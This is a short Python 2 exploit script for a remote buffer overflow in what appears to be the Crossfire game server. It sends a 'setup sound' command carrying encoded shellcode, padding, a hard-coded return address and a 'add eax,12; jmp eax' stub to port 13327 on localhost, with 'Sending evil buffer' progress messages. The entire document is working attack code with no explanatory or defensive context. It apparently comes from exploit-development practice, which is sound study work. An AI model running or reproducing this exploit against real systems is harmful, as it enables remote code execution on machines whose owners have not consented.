#!/usr/bin/python
import socket

#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax
#nasm > 

ret = "\x97\x45\x13\x08"
shellcode = (
"\xbd\xde\xa3\x10\x82\xdb\xcc\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x14\x83\xc0\x04\x31\x68\x10\x03\x68\x10\x3c\x56\x21\x59\x37"
"\x7a\x11\x1e\xe4\x17\x94\x29\xeb\x58\xfe\xe4\x6b\xc3\xa1\xa4"
"\x03\xf6\x5d\x58\x8f\x9c\x4d\x0b\x7f\xe8\x8f\xc1\x19\xb2\x82"
"\x96\x6c\x03\x19\x24\x6a\x34\x47\x87\xf2\x77\x38\x71\x3f\xf7"
"\xab\x27\xd5\xc7\x93\x1a\xa9\x71\x5d\x5d\xc1\xae\xb2\xee\x79"
"\xd9\xe3\x72\x10\x77\x75\x91\xb2\xd4\x0c\xb7\x82\xd0\xc3\xb8")

host = "127.0.0.1"
crash = shellcode + "\x41" * (4368-105) + ret + "\x83\xc0\x0c\xff\xe0" + "\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect ((host, 13327))
data = s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"
